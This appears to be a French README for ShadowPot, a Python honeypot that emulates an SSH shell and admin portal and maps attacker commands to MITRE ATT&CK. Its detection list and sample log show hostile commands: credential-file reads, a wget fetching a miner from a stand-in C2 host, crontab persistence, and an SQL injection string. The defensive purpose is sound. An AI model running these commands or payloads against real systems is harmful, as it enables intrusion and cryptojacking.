# 🍯 ShadowPot — Honeypot Interactif & Moteur de Profilage de Menaces MITRE ATT&CK

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)](https://python.org)
[![Security](https://img.shields.io/badge/Cybersécurité-Deception%20Technology-red?logo=kalilinux)](https://github.com/CalderaFourier-code)
[![Framework](https://img.shields.io/badge/MITRE%20ATT%26CK-v14-orange)](https://attack.mitre.org/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Author](https://img.shields.io/badge/Auteur-Tohon%20Fourier-brightgreen)](https://github.com/CalderaFourier-code)

**ShadowPot** est un système de déception (*Deception Technology / Honeypot*) interactif multi-services développé en Python. Il simule des services réseau légitimes (serveur shell Linux et portail web d'administration), enregistre l'intégralité des actions des attaquants en temps réel et applique un moteur de détection comportementale pour cartographier automatiquement chaque commande sur le **framework MITRE ATT&CK**.

Conçu **sans dépendance externe obligatoire**, ShadowPot fonctionne directement avec la bibliothèque standard Python et intègre un générateur de rapports d'incident HTML / JSON.

---

## 🌟 Fonctionnalités Principales

### 1. 🖥️ Faux Shell Linux Interactif (SSH / Telnet)
- Présentation d'une bannière SSH réaliste (`OpenSSH 8.4p1 Debian`).
- Capture des identifiants saisis en force brute (`username` / `password`).
- Émulation d'un shell interactif (`root@debian-server:~#`) avec faux système de fichiers (`/etc/passwd`, `/etc/os-release`, etc.).
- Enregistrement chronologique de chaque frappe et commande exécutée.

### 2. 🌐 Faux Portail Web d'Administration
- Écoute HTTP simulant une interface d'authentification intranet / admin vulnérable.
- Détection et piégeage des sondes automatisées (`/.env`, `/wp-login.php`, `/admin`).
- Capture des attaques par injection SQL (`' OR '1'='1`) et tentatives de brute-force HTTP POST.

### 3. 🧠 Moteur d'Analyse Heuristique & MITRE ATT&CK
Chaque interaction est corrélée en direct avec les techniques de cyberattaque :
- **T1003 — OS Credential Dumping** : Lecture de `/etc/passwd` ou `/etc/shadow`.
- **T1105 — Ingress Tool Transfer** : Tentatives de téléchargement (`wget`, `curl`).
- **T1082 — System Information Discovery** : Reconnaissance (`uname -a`, `cat /etc/os-release`).
- **T1033 — System Owner/User Discovery** : Identification de session (`whoami`, `id`, `w`).
- **T1053 — Scheduled Task / Job** : Tentatives de persistance via `crontab`.
- **T1222 — File Permissions Modification** : Exécution de `chmod +x`.
- **T1485 — Data Destruction** : Commandes destructrices (`rm -rf`).
- **T1190 — Exploit Public-Facing Application** : Injections SQL et fuzzing web.

### 4. 📊 Journalisation & Rapports d'Incident
- Stockage structuré dans `logs/sessions.json`.
- Rapport HTML dynamique de renseignement sur la menace (`logs/rapport_incidents.html`) avec métriques clés (nombre d'intrusions, IPs uniques, TTPs détectés).

---

## 🚀 Installation & Démarrage Rapide

Clonez le dépôt :
```bash
git clone https://github.com/CalderaFourier-code/shadowpot.git
cd shadowpot
```

### 1. Lancer la Démonstration Complète
Exécute une simulation offensive automatisée (shell + web) et génère le rapport d'incident :
```bash
python shadowpot.py --demo
```

### 2. Lancer le Honeypot en mode écoute réelle
```bash
python shadowpot.py --shell-port 2222 --web-port 8080
```
Pour tester la connexion depuis un autre terminal :
- **Tester le faux shell :** `nc localhost 2222` ou `telnet localhost 2222`
- **Tester le faux web :** Ouvrir `http://localhost:8080` dans un navigateur

---

## 📸 Aperçu Terminal en Temps Réel

```text
=== LANCEMENT DE LA SIMULATION D'ATTAQUE (ROUGE / OFFENSIVE) ===
Scénario 1 : Un attaquant externe compromet le shell Linux et exécute des TTPs...

[🚨 INTRUSION DÉTECTÉE] Connexion entrante depuis 185.220.101.5:48210
  [AUTH] Identifiants capturés : user='root', pass='toor123'
  [03:36:05] 185.220.101.5 $ whoami
    [⚡ MITRE T1033 - System Owner/User Discovery] (Discovery) -> Identification des privilèges
  [03:36:06] 185.220.101.5 $ cat /etc/passwd
    [⚡ MITRE T1003 - OS Credential Dumping] (Credential Access) -> Vol de comptes
  [03:36:06] 185.220.101.5 $ wget http://c2-malware.darknet.ru/miner.sh
    [⚡ MITRE T1105 - Ingress Tool Transfer] (Command and Control) -> Téléchargement de botnet
  [03:36:07] 185.220.101.5 $ crontab -e
    [⚡ MITRE T1053 - Scheduled Task / Job] (Persistence) -> Implantation de persistance

[🌐 WEB INTRUSION] Requête POST depuis 45.154.255.89 -> /login
  [POST DATA] username=admin' OR '1'='1&password=password
  [⚡ MITRE T1190 - Exploit Public-Facing Application] Injection SQL détectée

[✓] Rapport d'incident généré avec succès : logs/rapport_incidents.html
```

---

## 📁 Structure du Projet

```text
shadowpot/
├── shadowpot.py                 # Moteur principal Honeypot & Classifier MITRE
├── README.md                    # Documentation complète
└── logs/
    ├── sessions.json            # Base d'enregistrements JSON structurés
    └── rapport_incidents.html   # Rapport visuel Cyber / Threat Intelligence
```

---

## ⚖️ Avertissement Légal / Disclaimer

Ce logiciel est développé à des fins exclusives de recherche, de surveillance défensive et d'éducation en cybersécurité. Il est destiné à être déployé sur des réseaux sous votre contrôle pour étudier les menaces entrantes. L'auteur décline toute responsabilité quant à un usage non autorisé ou malveillant.

---

## 👤 Auteur

**Tohon Fourier**
- Spécialiste Cybersécurité Offensive & Défensive · DevSecOps
- GitHub : [@CalderaFourier-code](https://github.com/CalderaFourier-code)
- Email : [fouriertohon@gmail.com](mailto:fouriertohon@gmail.com)
